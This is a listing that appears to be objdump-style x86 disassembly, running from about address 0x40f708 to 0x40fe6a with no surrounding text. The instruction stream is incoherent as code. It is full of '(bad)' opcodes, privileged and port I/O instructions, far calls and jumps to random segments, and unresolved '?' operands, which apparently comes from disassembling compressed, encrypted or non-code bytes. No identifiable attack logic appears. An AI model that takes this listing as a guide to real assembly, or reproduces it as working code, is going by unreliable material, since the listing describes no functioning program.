  40f708:	inc    esi
  40f709:	jmp    0x40f6b3
  40f70b:	imul   esi,edi,0x4b
  40f70e:	mov    ecx,0x2380867b
  40f713:	outs   dx,DWORD PTR ds:[esi]
  40f714:	fcomp  QWORD PTR [ebx]
  40f716:	dec    edx
  40f717:	sbb    ebx,DWORD PTR [ecx-0x42545803]
  40f71d:	add    BYTE PTR [eax-0x51be271b],0x59
  40f724:	iret   
  40f725:	cmp    esi,ecx
  40f727:	mov    ebp,0xe26c062c
  40f72c:	rcl    DWORD PTR [eax],1
  40f72e:	idiv   BYTE PTR ds:0xa864885
  40f734:	jg     0x40f6e5
  40f736:	push   edi
  40f737:	push   ebp
  40f738:	popa   
  40f739:	push   eax
  40f73a:	loop   0x40f772
  40f73c:	sti    
  40f73d:	add    DWORD PTR [esi+0x29751550],esp
  40f743:	fmul   DWORD PTR [ebx-0x177865e4]
  40f74a:	xchg   BYTE PTR [esi],ah
  40f74c:	and    dl,0xe5
  40f74f:	outs   dx,DWORD PTR ds:[esi]
  40f750:	aad    0xc1
  40f752:	mov    dl,0x48
  40f754:	mov    eax,DWORD PTR [ebx+0x40c59174]
  40f75a:	dec    eax
  40f75b:	push   ds
  40f75c:	stos   DWORD PTR es:[edi],eax
  40f75d:	jg     0x40f790
  40f75f:	inc    ebx
  40f760:	test   BYTE PTR [edx+0x4b],cl
  40f763:	out    0x81,al
  40f765:	pushf  
  40f766:	mov    edx,DWORD PTR [ebx+esi*8-0xb]
  40f76a:	and    al,BYTE PTR [edx+edi*1+0x5be59e78]
  40f771:	jecxz  0x40f79b
  40f773:	test   bh,dh
  40f775:	(bad)  
  40f776:	lock loop 0x40f738
  40f779:	inc    esi
  40f77a:	rcl    BYTE PTR [ecx+0x28],1
  40f77d:	or     eax,0x48dd296
  40f782:	std    
  40f783:	or     ch,BYTE PTR [esi]
  40f785:	mov    dl,BYTE PTR [ecx+0x32]
  40f788:	call   0x5a0:0x6ac99760
  40f78f:	cmp    DWORD PTR [eax],edx
  40f791:	pop    esp
  40f792:	les    eax,FWORD PTR [ecx-0x58ec054e]
  40f798:	xchg   esi,eax
  40f799:	jno    0x40f76d
  40f79b:	cmc    
  40f79c:	push   ecx
  40f79d:	xchg   ebx,eax
  40f79e:	cmp    DWORD PTR [esi+0x1f],0x16
  40f7a2:	xchg   ecx,eax
  40f7a3:	xchg   ebx,eax
  40f7a4:	jo     0x40f765
  40f7a6:	shl    bl,cl
  40f7a8:	lods   eax,DWORD PTR ds:[esi]
  40f7a9:	lods   eax,DWORD PTR ds:[esi]
  40f7aa:	stc    
  40f7ab:	ss jae 0x40f805
  40f7ae:	xor    eax,0x21b7bca2
  40f7b3:	cmp    al,0xb3
  40f7b5:	dec    ebp
  40f7b6:	aad    0x0
  40f7b8:	pop    ebx
  40f7b9:	mov    al,ds:0x5e0a7e95
  40f7be:	mov    ds:0x58bcb11f,al
  40f7c3:	xchg   ebp,eax
  40f7c4:	and    dl,bl
  40f7c6:	aad    0x5e
  40f7c8:	add    al,0x7c
  40f7ca:	or     esp,DWORD PTR [eax]
  40f7cc:	arpl   WORD PTR [ebx-0x9b2a4a4],bp
  40f7d2:	repz test eax,0x27ca9fcf
  40f7d8:	mov    ecx,DWORD PTR [ecx+0x1526865f]
  40f7de:	js     0x40f790
  40f7e0:	in     eax,dx
  40f7e1:	mov    ds:0x37a64c10,eax
  40f7e6:	call   0x370a:0xd95ecb4
  40f7ed:	mov    eax,0x6a90a6d3
  40f7f2:	lods   eax,DWORD PTR ds:[esi]
  40f7f3:	les    eax,FWORD PTR [ebp+0x5c]
  40f7f6:	stc    
  40f7f7:	mov    BYTE PTR [edi+0x6b],dh
  40f7fa:	(bad)  
  40f7fb:	ret    0x4858
  40f7fe:	call   0xfcee76f6
  40f803:	mov    dh,0xc4
  40f805:	jns    0x40f817
  40f807:	mov    ebx,0xcd825d82
  40f80c:	out    0xf1,eax
  40f80e:	cwde   
  40f80f:	ins    BYTE PTR es:[edi],dx
  40f810:	sbb    BYTE PTR [ebp+0x216b731b],ah
  40f816:	mov    ebp,0xfebf014a
  40f81b:	dec    edx
  40f81c:	cmp    al,BYTE PTR [eax-0x47885556]
  40f822:	je     0x40f7d8
  40f824:	sbb    edx,DWORD PTR [ebp+0x33]
  40f827:	add    ebp,esi
  40f829:	dec    edi
  40f82a:	push   esi
  40f82b:	mov    al,0xc0
  40f82d:	hlt    
  40f82e:	jecxz  0x40f7d6
  40f830:	xor    eax,0xa1e66947
  40f835:	dec    eax
  40f836:	outs   dx,BYTE PTR ds:[esi]
  40f837:	xchg   ebp,eax
  40f838:	aad    0x18
  40f83a:	mov    al,ds:0x841ad329
  40f83f:	push   ss
  40f840:	call   0xf60f:0x967a1512
  40f847:	mov    cl,0x81
  40f849:	inc    ebx
  40f84a:	fidiv  DWORD PTR [ebx-0x3a]
  40f84d:	(bad)  
  40f84f:	adc    ebp,DWORD PTR [ebx+0x40a9af86]
  40f855:	pop    esi
  40f856:	push   es
  40f857:	test   BYTE PTR [edx+0x7c],cl
  40f85a:	rol    esi,1
  40f85c:	jmp    0x7a2c:0xb319fe6e
  40f863:	and    eax,DWORD PTR [esi]
  40f865:	inc    ebx
  40f866:	stos   DWORD PTR es:[edi],eax
  40f867:	call   FWORD PTR [edi]
  40f869:	ja     0x40f883
  40f86b:	push   cs
  40f86c:	jp     0x5b49986b
  40f872:	and    ecx,DWORD PTR [ebx]
  40f874:	push   cs
  40f875:	sub    eax,0x104dad47
  40f87a:	ret    0xce1
  40f87d:	dec    ecx
  40f87e:	outs   dx,BYTE PTR ds:[esi]
  40f87f:	cwde   
  40f880:	jmp    0x11366e11
  40f885:	inc    ebx
  40f886:	jae    0x40f896
  40f888:	stos   DWORD PTR es:[edi],eax
  40f889:	pop    edx
  40f88a:	je     0x40f83c
  40f88c:	lock push edi
  40f88e:	cmp    eax,0xfb27e844
  40f893:	cmp    eax,0xf9ef935
  40f898:	sbb    edi,esp
  40f89a:	stos   BYTE PTR es:[edi],al
  40f89b:	out    0x45,al
  40f89d:	sar    ebx,cl
  40f89f:	inc    edi
  40f8a0:	rcr    DWORD PTR [eax-0x1f],cl
  40f8a3:	inc    eax
  40f8a4:	imul   eax,DWORD PTR [esi+edi*4+0x2343fdb1],0x94999735
  40f8af:	fld    TBYTE PTR [eax+0x4a]
  40f8b2:	mov    ds:0x672db7f1,eax
  40f8b7:	xchg   DWORD PTR [ebx+0x61],esp
  40f8ba:	lea    ecx,[edi+0x2f]
  40f8bd:	mov    DWORD PTR [esi-0x1c],edi
  40f8c0:	jno    0x40f85a
  40f8c2:	imul   edx,DWORD PTR [edi+eax*4+0x74a6d4fa],0xffffff8e
  40f8ca:	push   ebp
  40f8cb:	popa   
  40f8cc:	aad    0xf1
  40f8ce:	dec    eax
  40f8cf:	add    al,0x6a
  40f8d1:	or     al,0x42
  40f8d3:	or     bl,BYTE PTR [edi]
  40f8d5:	je     0x40f892
  40f8d7:	stc    
  40f8d8:	jmp    0x40f86b
  40f8da:	je     0x40f8a6
  40f8dc:	aas    
  40f8dd:	loopne 0x40f875
  40f8df:	mov    esp,0xa997a5b
  40f8e4:	inc    esi
  40f8e5:	out    dx,eax
  40f8e6:	or     al,0xf6
  40f8e8:	fisubr DWORD PTR [esi]
  40f8ea:	ss pop edi
  40f8ec:	xchg   ebx,eax
  40f8ed:	add    eax,0x6aa073c0
  40f8f2:	call   0xdc66:0xd8cd400f
  40f8f9:	adc    al,0xb5
  40f8fb:	and    ah,BYTE PTR [ecx+0x50]
  40f8fe:	(bad)  
  40f900:	cdq    
  40f901:	rcl    BYTE PTR [ebx+0x3b],0x49
  40f905:	adc    al,0x9e
  40f907:	push   edi
  40f908:	(bad)  
  40f909:	outs   dx,DWORD PTR ds:[esi]
  40f90a:	clc    
  40f90b:	shr    ecx,1
  40f90d:	push   ebx
  40f90e:	ja     0x40f8e9
  40f910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f911:	add    eax,0x4bace81d
  40f916:	mov    dl,0x2
  40f918:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f919:	(bad)  
  40f91a:	mov    edx,edx
  40f91c:	mov    al,ds:0x7e927262
  40f921:	sub    ebp,DWORD PTR [ebx]
  40f923:	mov    eax,ds:0x2b883b79
  40f928:	cs inc edx
  40f92a:	addr16 dec ecx
  40f92c:	test   BYTE PTR [esi],bh
  40f92e:	stc    
  40f92f:	cld    
  40f930:	loop   0x40f95d
  40f932:	xor    dl,BYTE PTR [edi-0x73d9e7cc]
  40f938:	mov    eax,ds:0xa9a3419b
  40f93d:	cwde   
  40f93e:	jo     0x40f8ef
  40f940:	xchg   DWORD PTR [ebp+0x18],edx
  40f943:	and    BYTE PTR [ecx],bh
  40f945:	inc    esp
  40f946:	pop    gs
  40f948:	add    eax,0x3db41c4e
  40f94d:	lock fcmovbe st,st(4)
  40f950:	data16 jbe 0x40f98f
  40f953:	mov    dh,0x4d
  40f955:	cmp    eax,0x5ae315ac
  40f95a:	scas   eax,DWORD PTR es:[edi]
  40f95b:	pop    edi
  40f95c:	mov    edi,?
  40f95e:	mov    dh,0xbd
  40f960:	fcomp  DWORD PTR [edx-0x6f9f3a80]
  40f966:	cdq    
  40f967:	sbb    eax,0xcbf7c88e
  40f96c:	push   esp
  40f96d:	in     eax,0xe6
  40f96f:	in     eax,dx
  40f970:	sti    
  40f971:	cmc    
  40f972:	ss iret 
  40f974:	fiadd  DWORD PTR [eax+edi*8-0x2f]
  40f978:	xchg   ecx,eax
  40f979:	call   0xa83979bd
  40f97e:	test   al,0xd7
  40f980:	and    al,BYTE PTR [eax]
  40f982:	test   DWORD PTR [ebx+eiz*1+0x30944565],ebp
  40f989:	in     al,dx
  40f98a:	or     al,0x8d
  40f98c:	push   es
  40f98d:	or     DWORD PTR [eax+0x7876df7],edi
  40f993:	ss xchg bl,al
  40f996:	or     BYTE PTR [edi-0x22dba646],bh
  40f99c:	test   eax,0x3e33f90b
  40f9a1:	pop    ebx
  40f9a2:	sbb    eax,0x8f0bb548
  40f9a7:	cli    
  40f9a8:	dec    ebx
  40f9a9:	vpand  ymm5,ymm1,YMMWORD PTR [ebx]
  40f9ad:	vrsqrtss xmm3,xmm6,DWORD PTR [esi+0x65]
  40f9b2:	cmp    al,0x46
  40f9b4:	cmp    BYTE PTR [edx],cl
  40f9b6:	mov    bh,0x82
  40f9b8:	ror    DWORD PTR [ebx],1
  40f9ba:	aam    0xe0
  40f9bc:	lock idiv DWORD PTR gs:[esi-0x4f96ba9a]
  40f9c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9c5:	add    al,0xbc
  40f9c7:	ins    DWORD PTR es:[edi],dx
  40f9c8:	push   eax
  40f9c9:	dec    edi
  40f9ca:	pop    edx
  40f9cb:	aaa    
  40f9cc:	scas   al,BYTE PTR es:[edi]
  40f9cd:	jae    0x40f9aa
  40f9cf:	mov    edi,0xdf7f1744
  40f9d4:	shl    BYTE PTR [ecx+0x71],cl
  40f9d7:	sub    al,0x80
  40f9d9:	ror    BYTE PTR [ecx],0xd1
  40f9dc:	push   ebp
  40f9dd:	jg     0x40f9ba
  40f9df:	out    dx,al
  40f9e0:	mov    edx,0xdc842c6e
  40f9e5:	push   ecx
  40f9e6:	inc    edx
  40f9e7:	retf   
  40f9e8:	inc    edx
  40f9e9:	ret    0xb67b
  40f9ec:	and    DWORD PTR [edx],eax
  40f9ee:	push   edx
  40f9ef:	mov    ds:0x483ebb82,eax
  40f9f4:	mov    cr5,edi
  40f9f7:	rol    dl,cl
  40f9f9:	fdivr  DWORD PTR fs:[edi+0xafc9c30]
  40fa00:	ds scas eax,DWORD PTR es:[edi]
  40fa02:	cmc    
  40fa03:	dec    ebp
  40fa04:	inc    edi
  40fa05:	test   BYTE PTR [ebx],0x51
  40fa08:	repnz shr BYTE PTR [ebx+0x76],cl
  40fa0c:	and    al,0x81
  40fa0e:	not    BYTE PTR ss:[ebx+0x4355eef1]
  40fa15:	outs   dx,DWORD PTR ds:[esi]
  40fa16:	add    al,dl
  40fa18:	rcr    esp,0xb7
  40fa1b:	mov    ?,WORD PTR [edi-0x6b]
  40fa1e:	imul   BYTE PTR [ecx]
  40fa20:	test   eax,0x525aeaf3
  40fa25:	jae    0x40fa59
  40fa27:	iret   
  40fa28:	stos   BYTE PTR es:[edi],al
  40fa29:	aad    0x3e
  40fa2b:	bound  esp,QWORD PTR [edx]
  40fa2d:	into   
  40fa2e:	jle    0x40fa0b
  40fa30:	repz int3 
  40fa32:	or     eax,0xcf308fed
  40fa37:	sbb    al,BYTE PTR [edi]
  40fa39:	mov    ?,ecx
  40fa3b:	and    al,0x5
  40fa3d:	inc    esi
  40fa3e:	mov    edx,0xa0462426
  40fa43:	pusha  
  40fa44:	mov    ch,0x23
  40fa46:	fld    DWORD PTR [ebx-0x51061c8e]
  40fa4c:	cmp    ah,BYTE PTR [edi]
  40fa4e:	lock inc eax
  40fa50:	add    dl,BYTE PTR [eax+0x77]
  40fa53:	xor    eax,0xaeaf5047
  40fa58:	pop    ebx
  40fa59:	rol    BYTE PTR [ecx],0x4b
  40fa5c:	jecxz  0x40f9f7
  40fa5e:	mov    dh,0x6c
  40fa60:	cwde   
  40fa61:	pop    ebp
  40fa62:	or     BYTE PTR [eax],al
  40fa64:	pusha  
  40fa65:	xchg   ebx,eax
  40fa66:	lods   eax,DWORD PTR ds:[esi]
  40fa67:	mov    ebx,0xe41b5625
  40fa6c:	clc    
  40fa6d:	mov    edi,0x4bbae32e
  40fa72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa73:	add    eax,0x9dc5b2eb
  40fa78:	imul   edx,edx,0xea97c5a
  40fa7e:	or     BYTE PTR [ebp-0x1218c516],dh
  40fa84:	or     dl,bl
  40fa86:	out    0x91,eax
  40fa88:	es je  0x40fae7
  40fa8b:	pop    esi
  40fa8c:	dec    esi
  40fa8d:	adc    bl,BYTE PTR [edx]
  40fa8f:	jecxz  0x40fab3
  40fa91:	inc    esp
  40fa92:	cdq    
  40fa93:	pop    esi
  40fa94:	or     edi,DWORD PTR [ebx]
  40fa96:	mov    edi,0x2861b921
  40fa9b:	or     ah,BYTE PTR [edx]
  40fa9d:	or     dl,BYTE PTR [esi-0x47]
  40faa0:	push   eax
  40faa1:	shl    BYTE PTR [edi+0x3f],cl
  40faa4:	fcomp  DWORD PTR [ebx+edi*2]
  40faa7:	or     DWORD PTR [edx],esi
  40faa9:	nop
  40faaa:	retf   
  40faab:	xor    BYTE PTR [edi],cl
  40faad:	pop    es
  40faae:	or     ecx,DWORD PTR [ebp-0x39]
  40fab1:	and    BYTE PTR [ebx+0x10497ead],ah
  40fab7:	mov    ebx,0xc917a4cf
  40fabc:	(bad)  
  40fabd:	stos   DWORD PTR es:[edi],eax
  40fabe:	push   ds
  40fabf:	pop    ds
  40fac0:	daa    
  40fac1:	cmp    esi,DWORD PTR [ecx+0x68]
  40fac4:	mov    ds:0xb92bdd90,al
  40fac9:	stc    
  40faca:	in     al,0x2a
  40facc:	add    bl,BYTE PTR [ebx-0x2]
  40facf:	ins    BYTE PTR es:[edi],dx
  40fad0:	(bad)  
  40fad1:	fiadd  WORD PTR [esi]
  40fad3:	mov    ch,0xc3
  40fad5:	dec    edi
  40fad6:	jmp    0x40fa5a
  40fad8:	dec    ebx
  40fad9:	push   0xc715c9da
  40fade:	mov    ecx,0xb5952313
  40fae3:	test   edx,ebp
  40fae5:	out    dx,eax
  40fae6:	jmp    0xaca7:0x2ef76be2
  40faed:	mov    BYTE PTR [ebx+0x67],cl
  40faf0:	ror    al,1
  40faf2:	mov    BYTE PTR [ebp-0x40],ah
  40faf5:	jb     0x40fab0
  40faf7:	cmp    BYTE PTR ds:0xd2cbbf86,0x94
  40fafe:	cli    
  40faff:	xor    esi,DWORD PTR [eax-0x56591c85]
  40fb05:	sub    BYTE PTR [ecx-0x35],bl
  40fb08:	xor    al,0x44
  40fb0a:	jno    0x40fac8
  40fb0c:	sbb    eax,0x538782a2
  40fb11:	mov    dl,0x7c
  40fb13:	mov    ah,0xb
  40fb15:	xor    DWORD PTR [edx+0x1e],edi
  40fb18:	mov    eax,ds:0x6a201e58
  40fb1d:	js     0x40fb25
  40fb1f:	test   eax,0xb7c686a6
  40fb24:	pop    ds
  40fb25:	ret    
  40fb26:	and    edi,DWORD PTR [ebp+0x73]
  40fb29:	pop    edx
  40fb2a:	cmp    ebp,edi
  40fb2c:	mov    dl,0x8d
  40fb2e:	call   0x1c79:0xf278a6ee
  40fb35:	fiadd  WORD PTR [edx-0x2e]
  40fb38:	shr    DWORD PTR [edi-0x7118e77c],1
  40fb3e:	outs   dx,DWORD PTR ds:[esi]
  40fb3f:	sub    ch,al
  40fb41:	ss xchg esp,eax
  40fb43:	or     dl,BYTE PTR [edi+0x76a1bd9f]
  40fb49:	(bad)  
  40fb4a:	dec    eax
  40fb4b:	jae    0x40fb42
  40fb4d:	faddp  st(6),st
  40fb4f:	outs   dx,DWORD PTR ds:[esi]
  40fb50:	lods   eax,DWORD PTR ds:[esi]
  40fb51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb52:	not    edx
  40fb54:	xchg   ecx,eax
  40fb55:	scas   eax,DWORD PTR es:[edi]
  40fb56:	push   cs
  40fb57:	xchg   edx,eax
  40fb58:	clc    
  40fb59:	xchg   esi,eax
  40fb5a:	fisttp QWORD PTR [ecx+0x26f94ded]
  40fb60:	cli    
  40fb61:	xor    al,0x7d
  40fb63:	and    ax,0x3185
  40fb67:	push   ebx
  40fb68:	rcl    BYTE PTR [ecx],1
  40fb6a:	test   dl,0xb7
  40fb6d:	icebp  
  40fb6e:	repz loopne 0x40fb55
  40fb71:	or     edx,DWORD PTR [edi]
  40fb73:	push   ecx
  40fb74:	sbb    ebx,DWORD PTR [edx+0x52]
  40fb77:	pop    edi
  40fb78:	fdivr  QWORD PTR [ebx+edi*8-0x73bbd277]
  40fb7f:	mov    DWORD PTR [edi+edi*4+0x12],ebx
  40fb83:	sbb    eax,DWORD PTR [esi+eax*1]
  40fb86:	das    
  40fb87:	(bad)  
  40fb88:	sahf   
  40fb89:	sbb    ebx,DWORD PTR [edx-0x4062ab8a]
  40fb8f:	mov    esi,0x91eda971
  40fb94:	mov    eax,0x99344ea1
  40fb99:	fild   WORD PTR [ebx]
  40fb9b:	enter  0xdf56,0x35
  40fb9f:	retf   
  40fba0:	or     DWORD PTR [edx],ebp
  40fba2:	and    ebp,edx
  40fba4:	add    DWORD PTR [esi],ebp
  40fba6:	and    bl,BYTE PTR [ebp-0x7c7b7e50]
  40fbac:	jge    0x40fbb8
  40fbae:	and    eax,0xc2ae2b2d
  40fbb3:	add    bh,al
  40fbb5:	(bad)  
  40fbb6:	scas   al,BYTE PTR es:[edi]
  40fbb7:	emms   
  40fbb9:	sti    
  40fbba:	push   cs
  40fbbb:	enter  0x6e63,0xb
  40fbbf:	or     DWORD PTR [ebp-0x313e1f0d],ecx
  40fbc5:	nop
  40fbc6:	mov    dl,0x55
  40fbc8:	cmp    edx,eax
  40fbca:	popa   
  40fbcb:	add    ch,BYTE PTR [ecx+ecx*8]
  40fbce:	dec    ebx
  40fbcf:	cmp    DWORD PTR [ebp-0x37ba40e3],esp
  40fbd5:	push   ebp
  40fbd6:	(bad)  
  40fbd7:	sub    eax,0x7bed6577
  40fbdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbdd:	pushf  
  40fbde:	out    0x7c,al
  40fbe0:	xor    BYTE PTR [ebp+0x4b],bh
  40fbe3:	push   ss
  40fbe4:	jmp    0x5ff9eb88
  40fbe9:	or     DWORD PTR [esi+0x41],esp
  40fbec:	daa    
  40fbed:	sub    DWORD PTR [eax],edx
  40fbef:	in     al,0xb6
  40fbf1:	sbb    esp,DWORD PTR [ebx+0x29261741]
  40fbf7:	xchg   esi,eax
  40fbf8:	arpl   WORD PTR [ecx],sp
  40fbfa:	xor    ebp,eax
  40fbfc:	xchg   ecx,edi
  40fbfe:	mov    edi,0x2155f623
  40fc03:	mov    bh,0x21
  40fc05:	sub    al,0x6b
  40fc07:	loopne 0x40fc41
  40fc09:	jmp    0x575b:0x8e4318e4
  40fc10:	dec    eax
  40fc11:	in     al,dx
  40fc12:	aam    0xa0
  40fc14:	lahf   
  40fc15:	or     edx,DWORD PTR ds:0x9b7f229c
  40fc1b:	jmp    0x40fc36
  40fc1d:	cld    
  40fc1e:	shl    esi,1
  40fc20:	ret    
  40fc21:	pop    eax
  40fc22:	adc    al,0xab
  40fc24:	retf   0xa0fe
  40fc27:	jo     0x40fc46
  40fc29:	sub    ah,bh
  40fc2b:	jg     0x40fc85
  40fc2d:	jmp    0x7236:0x1039c20f
  40fc34:	inc    edx
  40fc35:	lahf   
  40fc36:	cli    
  40fc37:	cmp    eax,0x874e5bed
  40fc3c:	pop    ss
  40fc3d:	jle    0x40fc54
  40fc3f:	pop    eax
  40fc40:	mov    ebx,0xaf4a0e72
  40fc45:	test   edi,esp
  40fc47:	xor    ecx,edi
  40fc49:	mov    dl,0x42
  40fc4b:	jle    0x40fc1a
  40fc4d:	rcr    BYTE PTR [ecx-0x6eaf426d],cl
  40fc53:	mov    eax,0xd40b934a
  40fc58:	and    BYTE PTR [ebp+0x6e4cb06d],dl
  40fc5e:	mov    ah,cl
  40fc60:	cmp    al,0x61
  40fc62:	pop    edx
  40fc63:	xchg   ecx,eax
  40fc64:	jbe    0x40fbed
  40fc66:	in     eax,0xa8
  40fc68:	cli    
  40fc69:	xchg   esi,eax
  40fc6a:	call   0xe6ad2080
  40fc6f:	das    
  40fc70:	add    bl,dh
  40fc72:	cld    
  40fc73:	jecxz  0x40fcc3
  40fc75:	cmp    BYTE PTR [eax],dl
  40fc77:	dec    esi
  40fc78:	jmp    0xc3b0ede8
  40fc7d:	ins    BYTE PTR es:[edi],dx
  40fc7e:	inc    ebx
  40fc7f:	dec    BYTE PTR [esi-0x5174db2a]
  40fc85:	(bad)  
  40fc86:	icebp  
  40fc87:	retf   
  40fc88:	cmp    eax,0x58bc6e2a
  40fc8d:	jmp    0x40fd01
  40fc8f:	inc    ebx
  40fc90:	int3   
  40fc91:	stc    
  40fc92:	nop
  40fc93:	jb     0x40fcda
  40fc95:	cmc    
  40fc96:	out    dx,al
  40fc97:	pop    esi
  40fc98:	cmc    
  40fc99:	imul   esi,ebx,0x5d72aaa1
  40fc9f:	jge    0x40fc6d
  40fca1:	out    0xd6,eax
  40fca3:	(bad)  [eax-0x79cd8131]
  40fca9:	stos   DWORD PTR es:[edi],eax
  40fcaa:	mov    al,ds:0xe0b79484
  40fcaf:	mov    cl,0x6e
  40fcb1:	in     al,dx
  40fcb2:	push   ss
  40fcb3:	pop    esp
  40fcb4:	sti    
  40fcb5:	or     eax,0x852c39a4
  40fcba:	lods   al,BYTE PTR ds:[esi]
  40fcbb:	xor    eax,0x2fbd1c54
  40fcc0:	cmp    BYTE PTR [edx-0x80],dl
  40fcc3:	mov    dl,0xed
  40fcc5:	push   esi
  40fcc6:	shr    BYTE PTR [esi-0xe],0x31
  40fcca:	xlat   BYTE PTR ds:[ebx]
  40fccb:	add    eax,0x4221d480
  40fcd0:	jle    0x40fd14
  40fcd2:	and    DWORD PTR [ecx],0x3cf8c613
  40fcd8:	sbb    ebp,DWORD PTR [edi+0x645a3a30]
  40fcde:	cmp    eax,0x80fac258
  40fce3:	ret    0x1a15
  40fce6:	aas    
  40fce7:	test   DWORD PTR [ebp+0x78],edx
  40fcea:	cmc    
  40fceb:	call   0xc8c8ba59
  40fcf0:	ret    0xb989
  40fcf3:	inc    esp
  40fcf4:	(bad)  
  40fcf5:	popa   
  40fcf6:	push   0x97db4ae8
  40fcfb:	retf   
  40fcfc:	xor    dh,BYTE PTR [eax]
  40fcfe:	sub    ecx,edx
  40fd00:	ss push edi
  40fd02:	in     eax,0xe5
  40fd04:	idiv   DWORD PTR [edi-0x3f]
  40fd07:	mov    DWORD PTR gs:[ebp+0x6005cb9b],ebx
  40fd0e:	es in  al,dx
  40fd10:	bound  ebx,QWORD PTR cs:[edx]
  40fd13:	pop    ecx
  40fd14:	loopne 0x40fcbe
  40fd16:	push   cs
  40fd17:	adc    edi,DWORD PTR [ebx]
  40fd19:	pusha  
  40fd1a:	cmp    eax,0x638053e4
  40fd1f:	rol    cl,0xd3
  40fd22:	xchg   esi,eax
  40fd23:	xor    bl,BYTE PTR [eax+ebx*1]
  40fd26:	in     al,0xf4
  40fd28:	std    
  40fd29:	mov    esp,0x4894238e
  40fd2e:	iret   
  40fd2f:	cld    
  40fd30:	sbb    eax,0x5217ea7d
  40fd35:	jmp    FWORD PTR [eax-0x49]
  40fd38:	mov    edx,0x9decdae6
  40fd3d:	cmp    DWORD PTR [ebx-0x7f32aa9a],esp
  40fd43:	xchg   edx,eax
  40fd44:	call   0xc9db:0xcdb4199a
  40fd4b:	outs   dx,DWORD PTR ds:[esi]
  40fd4c:	pop    ds
  40fd4d:	scas   al,BYTE PTR es:[edi]
  40fd4e:	sbb    edi,DWORD PTR [eax-0x529df1dd]
  40fd54:	enter  0x42d1,0xd8
  40fd58:	mov    eax,0xad8c6392
  40fd5d:	inc    ebp
  40fd5e:	test   BYTE PTR [esp-0x65c565fe],0x95
  40fd66:	idiv   BYTE PTR [ebx-0x31]
  40fd69:	adc    ebx,eax
  40fd6b:	out    0xb5,eax
  40fd6d:	and    edx,DWORD PTR [eax]
  40fd6f:	fidiv  WORD PTR [eax+0x61df14c8]
  40fd75:	sub    ah,ah
  40fd77:	mov    al,ds:0xcd887532
  40fd7c:	ss cmp edx,esp
  40fd7f:	pop    ds
  40fd80:	or     DWORD PTR [edx+0xfc0a0b6],edx
  40fd86:	ret    
  40fd87:	shl    BYTE PTR [eax],1
  40fd89:	hlt    
  40fd8a:	and    BYTE PTR [ebx+0x22d4662a],ah
  40fd90:	fst    DWORD PTR [eax+0x63]
  40fd93:	femms  
  40fd95:	jno    0x40fd49
  40fd97:	jl     0x40fd1e
  40fd99:	sub    al,0x2d
  40fd9b:	in     al,dx
  40fd9c:	fwait
  40fd9d:	or     eax,0x92117814
  40fda2:	inc    ecx
  40fda3:	pop    ebx
  40fda4:	daa    
  40fda5:	cs (bad) 
  40fda7:	sbb    al,0x98
  40fda9:	xor    ebp,DWORD PTR [edi+0x6e]
  40fdac:	lods   eax,DWORD PTR ds:[esi]
  40fdad:	pop    ss
  40fdae:	gs in  al,dx
  40fdb0:	jp     0x40fd38
  40fdb2:	in     al,dx
  40fdb3:	(bad)  
  40fdb4:	add    dl,BYTE PTR [ecx+0x2165b79b]
  40fdba:	into   
  40fdbb:	cmp    BYTE PTR [edx],0x6c
  40fdbe:	mov    ebp,0xb915f69a
  40fdc3:	push   edx
  40fdc4:	push   edx
  40fdc5:	pop    esi
  40fdc6:	nop
  40fdc7:	dec    edx
  40fdc8:	mov    al,0x48
  40fdca:	neg    DWORD PTR [edi]
  40fdcc:	lfs    ecx,FWORD PTR [edi-0x1f]
  40fdd0:	mov    WORD PTR ds:0x2e175ad7,gs
  40fdd6:	inc    ecx
  40fdd7:	sub    eax,DWORD PTR [ebp-0x51]
  40fdda:	push   0x33ba8625
  40fddf:	push   0x23
  40fde1:	xor    esp,DWORD PTR [esi-0x4]
  40fde4:	stc    
  40fde5:	ret    0x2b36
  40fde8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fde9:	xor    esi,edi
  40fdeb:	pop    ss
  40fdec:	add    cl,BYTE PTR [ebp+0x56]
  40fdef:	lock push ebx
  40fdf1:	vminsd xmm3,xmm5,QWORD PTR [ebx+0x5a2ea239]
  40fdf9:	mov    bh,0xeb
  40fdfb:	xchg   bh,bh
  40fdfd:	cmp    cl,BYTE PTR [eax]
  40fdff:	imul   esi,DWORD PTR [edx],0xffffff80
  40fe02:	cmp    al,0xf4
  40fe04:	ds pop ss
  40fe06:	in     al,dx
  40fe07:	rcl    BYTE PTR [ecx+0x51],0x7
  40fe0b:	ins    BYTE PTR es:[edi],dx
  40fe0c:	test   eax,0x42a2948c
  40fe11:	clc    
  40fe12:	ret    0x460f
  40fe15:	(bad)  
  40fe16:	cmp    ebp,esp
  40fe18:	es and eax,0x282111e0
  40fe1e:	inc    edi
  40fe1f:	xchg   ecx,eax
  40fe20:	out    0x98,eax
  40fe22:	xchg   edi,ecx
  40fe24:	jns    0x40fe64
  40fe26:	dec    esp
  40fe27:	imul   ebp,DWORD PTR [edi],0xffffff8b
  40fe2a:	inc    ebx
  40fe2b:	outs   dx,DWORD PTR ds:[esi]
  40fe2c:	xchg   edi,eax
  40fe2d:	mov    eax,0x6daa5aa0
  40fe32:	jne    0x40fe4d
  40fe34:	dec    ebx
  40fe35:	add    esp,0x5b
  40fe38:	ins    BYTE PTR es:[edi],dx
  40fe39:	xchg   BYTE PTR [esi],cl
  40fe3b:	mov    ebp,0x3312e285
  40fe40:	loope  0x40fe69
  40fe42:	mov    ch,0xb1
  40fe44:	add    al,0xf8
  40fe46:	dec    esi
  40fe47:	ss pop edi
  40fe49:	stc    
  40fe4a:	ret    
  40fe4b:	pop    esp
  40fe4c:	mul    edi
  40fe4e:	xor    esi,DWORD PTR [edx]
  40fe50:	sub    eax,0x540f281f
  40fe55:	retf   0xd817
  40fe58:	xlat   BYTE PTR ds:[ebx]
  40fe59:	aad    0xab
  40fe5b:	or     ecx,edx
  40fe5d:	push   es
  40fe5e:	es mov dh,0xd0
  40fe61:	fistp  WORD PTR [eax-0x60]
  40fe64:	test   BYTE PTR [ebx-0x38],bh
  40fe67:	or     BYTE PTR [ecx-0x1a],ah
  40fe6a:	sbb    ebx,0x12
